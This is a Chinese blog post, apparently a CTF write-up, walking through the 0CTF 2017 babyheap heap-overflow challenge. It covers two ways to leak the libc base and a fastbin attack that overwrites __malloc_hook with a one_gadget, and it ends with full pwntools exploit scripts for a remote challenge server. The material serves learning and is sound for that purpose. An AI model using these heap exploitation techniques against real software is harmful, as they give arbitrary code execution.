---
title: babyheap_0ctf_2017做题记录
date: 2022-07-25 02:17:12
categories: pwn learning
tags: 
- pwn
- heap
- buu刷题 
---

第一次做堆题，研究了好一会，最后还是在libc的one_gadget部分留下了一些疑点(很有可能是自己的libc替换操作问题？)，希望过些时候能理解清楚。

<!-- more -->

# 2017_0ctf_babyheap

## 前言

遇上了glibc版本不匹配的问题，学习了一下`patchelf`以及`glibc_all_in_one`的使用。

函数漏洞主要是在Fill函数中填充数据大小没有和chunk大小做对比，存在堆溢出

主体思路：通过多种方法泄露libc基址，然后用`arbitrary alloc`将chunk分配到`__malloc_hook`附近，使用Fill函数覆盖 `__malloc_hook`在该位置处构造ROP链。因为malloc会调用`__malloc_hook`，所以调用malloc时会自动跳转执行ROP链

**大致过程**：

泄露libc基地址构造ROP链

因为开启aslr所以libc的基址会发生变化。采取`unsorted bin leak`泄露`main_arena`地址进而计算。通过ida查看libc中`malloc_trim`函数中`main_arena`相对于libc的偏移值。

下图为buu的ubuntu16中malloc_trim片段，可以看出`main_arena`的偏移地址为`0x3C4B20`(看了一下wiki计算基址的另外一种方法，直接dump出`malloc_hook`偏移值进而+0x10获取基址，貌似也可行)

![0x1](/img/image-20220722194222164.png)

```python
main_arena_offset = ELF("libc.so.6").symbols["__malloc_hook"] + 0x10 #wiki上获取基址的方法 
```

## 方法一：双指针指向small_chunk

**首先试一下[看雪老哥](https://bbs.pediy.com/thread-268200.htm)的方法，同时也是wiki的方法** 

1. 泄露libc基地址

   ```python
   allocate(0x10) #用以修改chunk1的值
   allocate(0x10) #用以辅助chunk2指向chunk4(构造fastbinsY单向链表)
   allocate(0x10) #用以指向chunk4的内容
   allocate(0x10) #用以修改chunk4的值
   allocate(0x80) # small bin
   free(2)		
   free(1)		#fastbin[0] -> babychunk1 -> babychunk2 <- 0x0
   ```

   ![0x2](/img/image-20220723210043156.png)

   >  分别往babychunk0和babychunk3填充数据。
   >
   > - 对于babychunk0，首先填充完它自己的user data部分，然后填充babychunk1使得babychunk1的fd指针的最后一字节变成0x80，也就是使得babychunk4取代babychunk2在fastbin里的位置。
   > - 对于babychunk3，首先填充完它自己的user data部分，然后填充babychunk4，使得babychunk4的size变成0x20。

   ```python
   payload = 0x10 * 'a' + p64(0) + p64(0x21) + p8(0x80)
   fill(0, len(payload), payload)			 #fastbin[0] -> babychunk1 -> babychunk4<- 0x0
   #这里之所以能够直接send 0x80 以修改fastbin1的fd为chunk4是因为:
   #堆的地址始终是 4KB 对齐的,第四个chunk的起始地址的首个字节必为0x80.
   payload = 0x10 * 'a' + p64(0) + p64(0x21)
   fill(3, len(payload), payload) 			#填充smallchunk，修改chunk_size 为 fastbin_size
   ```

   ![0x3](/img/image-20220723214017768.png)

   ```python
   #重新分配被free掉的chunk
   allocate(0x10) #content指针指向被free掉的chunk1
   allocate(0x10) #content指针指向smallchunk的content地址
   ```

   ![0x4](/img/image-20220723214419849.png)

   ```python
   #重新设置smallchunk的size为0x91
   payload = 0x10 * 'a' + p64(0) + p64(0x91)
   fill(3, len(payload), payload)
   ```

   ![0x5](/img/image-20220723214632928.png)

   >  分配一个新的0x90大小的babychunk5，目的是为了**防止紧接着free的babychunk4和top chunk合并**。

   allocate了一个chunk5后，free babychunk4使得babychun4进入unsortedbin，此时babychunk4的fd和bk都指向（main_arena+88）。

   ```python
   allocate(0x80) 
   free(4)
   ```

   ![0x6](/img/image-20220723230203073.png)

   利用dump选项泄漏babychunk4的fd（main_arena+88），计算libc基址。

   ```python
   dump(2)
   p.recvuntil("Content: \n")
   arena_addr = u64(p.recv(8)) - 88
   main_arena_offset = ELF("libc-2.23.so").symbols["__malloc_hook"] + 0x10 #wiki上获取基址的方法 
   libc_base = arena_addr - main_arena_offset
   ```

2. 实施`arbitrary alloc`

   将chunk分配到__malloc_hook附近

   ![0x7](/img/image-20220724030049259.png)

   经过调试可得fake_chunk的size地址应为`0x7f7c95dceaf0 + 0x5` ，即fake_chunk的地址应为`main_arena - 0x2b - 0x8`(因为每次地址随机，所以采用相对寻址)

   > 根据chunk的size计算其在fastbin数组中index的宏如下所示：
   >
   > ```c
   > #define fastbin_index(sz) ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)
   > ```
   >
   > 那么，64位程序：0x7f/16-2=5。所以0x7f对应的fastbin单链表要求的size为0x70，user data部分的size为0x60。

   先构造实现fake_chunk的条件，创造一个fastbin并改写他的fd值使其指向fake_chunk

   ```python
   allocate(0x60)
   free(4)
   ```

   ![0x8](/img/image-20220724004836041.png)

   通过上图可以分析得: 原本被free掉的small_chunk被分割成了两个部分，前半部分为0x70(fast_bin)，后半部分为0x20(unsorted_bin)。因此方才指向chunk4 content的指针还可以使用，直接通过Fill chunk2填充被分割而得来的新fastbin的fd，使其指向fake_chunk地址。紧接着alloc两个chunk，第一个获得改写过fd的chunk4，第二个获取`__malloc_hook`附近的chunk

   ```python
   fake_chunk_addr = main_arena - 0x2b - 0x8
   fake_chunk = p64(fake_chunk_addr)
   fill(2, len(fake_chunk), fake_chunk)
   alloc(0x60)
   #gdb() 具体情况如下图所示
   alloc(0x60)#在此处gdb发现被alloc的chunk并不能在parseheap中显示
   ```

   ![0x9](/img/image-20220724031232617.png)

   最后写入ROP链并执行，理论上就打通了

   ```python
   one_gadget_addr = libc_base + 0x4527a
   payload = 0x13 * b'a' + p64(one_gadget_addr)
   fill(6, len(payload), payload)
   allocate(0x100)
   ```

   实际操作中打不通，看了wiki和其他师傅的wp后发现只要将`0x4527a`改成`0x4526a`就打通了，(如图为我的one_gadget结果，使用的是all_in_one中的2.23-0ubuntu11.3_amd64)

   ![0xa](/img/image-20220724033857414.png)

   用了buuctf的`libc-2.23.so`看了一下。但是使用了buu给的libc之后本地仍然打不通...

   ![0xb](/img/image-20220724040122446.png)

## 方法二：通过chunk重叠泄露

[参考网址](https://blog.csdn.net/qq_29343201/article/details/66476135)

```c
//目标构造结果                             chunk 1 ends here ----+
          |------    ------  fake_chunk(0x70)   ------    ------|
          v                                                     v
+---------+-----------+----------------+---------------+--------+-----
| chunk0  | new chunk1|                |  chunk2 head  | libc!  |  next size
| 0x60    |head(0x10) | content 0x40   |               | (fd,bk)| (be valid size)
+---------+-----------+----------------+---------------+-------------     
```

1. allocate chunk为leak做准备

   ```python
   allocate(0x60)	#用作修改之后分配的chunk
   allocate(0x40)	#构造一个fastbin类的chunk1用作最终泄露的chunk
   allocate(0x100)	#构造一个smallbin类的chunk2用以泄露地址
   ```

   ![0xc](/img/image-20220725203007401.png)

4. 通过堆溢出修改chunk1的size(大小必须在fastbin范围之内)，此处size修改为0x70

   ```python
   payload= b'a'*0x60 + p64(0) + p64(0x71)
   fill(0,len(payload),payload) #堆溢出修改chunk1_size构成重叠的chunk
   ```

3. 修改chunk2中fake_chunk中nextsize，用以通过free fastbin时的检查(以下为`_int_free 2.23`部分源码)

   ```c
   //因为要将其分配到fastbin所以需要接受以下判断
   if (__builtin_expect(   //检查后面的chunk的size是否大于2*SIZE_SZ
         chunksize_nomask(chunk_at_offset(p, size)) <= 2 * SIZE_SZ, 0) ||
               __builtin_expect(  //检查下一个chunk的size不大于sys_mem
                   chunksize(chunk_at_offset(p, size)) >= av->system_mem, 0)) {
               /* We might not have a lock at this point and concurrent
                  modifications
                  of system_mem might have let to a false positive.  Redo the test
                  after getting the lock.  */
               if (have_lock || ({
                       assert(locked == 0);
                       __libc_lock_lock(av->mutex);
                       locked = 1;
                       chunksize_nomask(chunk_at_offset(p, size)) <= 2 * SIZE_SZ ||
                           chunksize(chunk_at_offset(p, size)) >= av->system_mem;
                   })) {
                   errstr = "free(): invalid next size (fast)";
                   goto errout;
               }
               if (!have_lock) {
                   __libc_lock_unlock(av->mutex);
                   locked = 0;
               }
           }
   ```

   ```python
   payload= b'a'*0x10 + p64(0) + p64(0x71)
   fill(2,len(payload),payload) 
   #由下图可见将chunk1_size成功改为了0x70，由于chunk2头位于chunk1的content中所以无法识别
   #所以parseheap识别出的是chunk1的content段后自行填充的next_chunk的size值
   ```

   ![0xd](/img/image-20220725213852928.png)

4. free chunk1使fake_chunk进入fastbin中，`allocate(0x60)`,重新将获取chunk1，因为程序中调用的时calloc，内容全部置零

   ```python
   free(1) #因为使用dump输出content时，输出的大小需要在allocate的size之内，所以需要重新分配chunk
   allocate(0x60)   #由下图可见重新分配的chunk1内容被置0
   ```

   ![0xe](/img/image-20220725214635353.png)

7. 直接通过Fill函数手动修改chunk2的头部，free chunk2然后通过dump chunk1泄露地址

   ```python
   payload= b'a'*0x40 + p64(0) + p64(0x111)
   fill(1,len(payload),payload)
   allocate(0x50) #防止free掉的chunk2与topchunk合并
   free(2) #由下图可见unsortedbin中 free掉的chunk2里fd和bk都已经指向了main_arena+88的位置
   ```

   ![0xf](/img/image-20220725222331747.png)

8. 泄露libc基址

   ```python
   dump(1)
   p.recvuntil("Content: \n")
   p.recv(0x50)
   main_aren88 = u64(p.recv(8))
   main_arena_offset = ELF("libc-2.23.so").symbols["__malloc_hook"] + 0x10 #wiki上获取基址的方法 
   libc_base = arena_addr - main_arena_offset
   ```

   ![0x10](/img/image-20220725224226130.png)

接下来就是使用`arbitrary alloc` 利用`__malloc_hook`获取shell

分析一下当前的chunk状况

![0x11](/img/babyheap_0ctf_2017_1.png)

```python
allocate(0x60)#allocate一个新chunk2，用以arbitrary alloc
#chunk2是从unsorted chunk中分割得来，chunk分布如下(chunk3位置不变，图未截全)
```

![0x12](/img/babyheap_0ctf_2017_2.png)

```python
#此时采用arbitrary alloc的思想，通过修改chunk2的fd实现任意位置chunk修改
free(2)
fake_chunk_addr = arena_addr - 0x33
payload= b'a'*0x40 + p64(0)+p64(0x71)+p64(fake_chunk_addr)
fill(1, len(payload), payload)
```

![0x13](/img/image-20220726004159403.png)

```python
#fill以覆盖__malloc_hook，执行one_gadget
allocate(0x60)
allocate(0x60)
one_gadget_addr = libc_base + 0x4526a
payload = 0x13 * b'a' + p64(one_gadget_addr)
fill(4, len(payload), payload)
allocate(0x100)
```

![0x14](/img/image-20220726004454370.png)

## 完整exp

```python
#方法1
from pwn import *
context(log_level='debug',arch='amd64',os='linux')
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
p = remote('node4.buuoj.cn',26522 )
def offset_bin_main_arena(idx):
    word_bytes = context.word_size / 8
    offset = 4  # lock
    offset += 4  # flags
    offset += word_bytes * 10  # offset fastbin
    offset += word_bytes * 2  # top,last_remainder
    offset += idx * 2 * word_bytes  # idx
    offset -= word_bytes * 2  # bin overlap
    return offset
def dbg():
        gdb.attach(p)
        pause()
 
def allocate(size):
    p.recvuntil('Command: ')
    p.sendline('1')
    p.recvuntil('Size: ')
    p.sendline(str(size))
 
def fill(idx, size, content):
    p.recvuntil('Command: ')
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(idx))
    p.recvuntil('Size: ')
    p.sendline(str(size))
    p.recvuntil('Content: ')
    p.send(content)
 
def free(idx):
    p.recvuntil('Command: ')
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline(str(idx))
 
def dump(idx):
    p.recvuntil('Command: ')
    p.sendline('4')
    p.recvuntil('Index: ')
    p.sendline(str(idx))

#通过chunk2泄露libc基址
allocate(0x10)
allocate(0x10)
allocate(0x10)
allocate(0x10)
allocate(0x80)
free(2)
free(1)
payload = b"a"*0x10 + p64(0) + p64(0x21) + p8(0x80)
fill(0, len(payload), payload)
payload = 0x10 * b'a' + p64(0) + p64(0x21)
fill(3, len(payload), payload)
allocate(0x10)
allocate(0x10)
payload = 0x10 * b'a' + p64(0) + p64(0x91)
fill(3, len(payload), payload)
allocate(0x80)
free(4)
dump(2)
p.recvuntil("Content: \n")
arena_addr = u64(p.recv(8)) - 88
#print(hex(arena_addr))
main_arena_offset = ELF("libc-2.23.so").symbols["__malloc_hook"] + 0x10 #wiki上获取基址的方法 
libc_base = arena_addr - main_arena_offset
#print(hex(libc_base))
leak('libc base addr',libc_base)
#以下实现在__malloc_hook附近分配chunk覆盖__malloc_hook，
allocate(0x60)
free(4)
fake_chunk_addr = arena_addr - 0x33
fake_chunk = p64(fake_chunk_addr)
fill(2, len(fake_chunk), fake_chunk)
allocate(0x60)
allocate(0x60)
one_gadget_addr = libc_base + 0x4526a
payload = 0x13 * b'a' + p64(one_gadget_addr)
fill(6, len(payload), payload)
allocate(0x100)
p.interactive()
```

```python
#方法2
from pwn import *
context(log_level='debug',arch='amd64',os='linux')
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
p = remote('node4.buuoj.cn',26522)
#函数定义与方法一相同
allocate(0x60) #0
allocate(0x40) #1
allocate(0x100) #2
payload= b'a'*0x60 + p64(0) + p64(0x71)
fill(0,len(payload),payload)
payload= b'a'*0x10 + p64(0) + p64(0x71)
fill(2,len(payload),payload)
free(1)
allocate(0x60) #1
payload= b'a'*0x40 + p64(0) + p64(0x111)
fill(1,len(payload),payload)
allocate(0x50) #3
free(2)
dump(1)
p.recvuntil("Content: \n")
p.recv(0x50)
main_aren88 = u64(p.recv(8))
arena_addr = main_aren88 - 88
#print(hex(arena_addr))
main_arena_offset = ELF("libc-2.23.so").symbols["__malloc_hook"] + 0x10 #wiki上获取基址的方法 
libc_base = arena_addr - main_arena_offset
leak('libc base addr',libc_base)
print(hex(libc_base))
#以下实现在__malloc_hook附近分配chunk覆盖__malloc_hook，
allocate(0x60) #2
free(2)
fake_chunk_addr = arena_addr - 0x33
payload= b'a'*0x40 + p64(0)+p64(0x71)+p64(fake_chunk_addr)
fill(1, len(payload), payload)
allocate(0x60)
allocate(0x60)
one_gadget_addr = libc_base + 0x4526a
payload = 0x13 * b'a' + p64(one_gadget_addr)
fill(4, len(payload), payload)
allocate(0x100)
p.interactive()
```

